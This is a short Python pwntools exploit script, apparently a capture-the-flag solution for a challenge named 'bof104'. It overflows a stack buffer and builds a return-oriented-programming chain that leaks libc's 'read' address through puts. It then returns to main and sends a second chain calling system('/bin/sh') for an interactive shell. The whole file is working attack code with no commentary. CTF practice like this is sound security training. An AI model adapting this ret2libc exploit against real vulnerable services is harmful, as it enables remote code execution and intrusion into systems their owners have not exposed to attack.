#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof104_patched")
libc = ELF("./libc.so.6")


def start(argv=[], *a, **kw):
    # nc bof104.sstf.site 1337
    host = args.HOST or 'bof104.sstf.site'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pad = 0x20
pop_rdi = 0x00401263
ret = pop_rdi + 2

payload = b"A" * pad
payload += p64(elf.bss(0x200))
payload += flat(pop_rdi, elf.got["read"], elf.plt["puts"])
payload += flat(elf.symbols["main"])

io.send(payload)
io.recvline()
leak_read = u64(io.recv(6).ljust(8, p8(0)))

libc.address = leak_read - libc.symbols["read"]
log.info(f"{libc.address=:#x}")

payload = b"A" * pad
payload += p64(elf.bss(0x200))
payload += flat(pop_rdi,
                next(libc.search(b"/bin/sh\x00")),
                ret,
                libc.symbols["system"])

io.send(payload)

io.interactive()
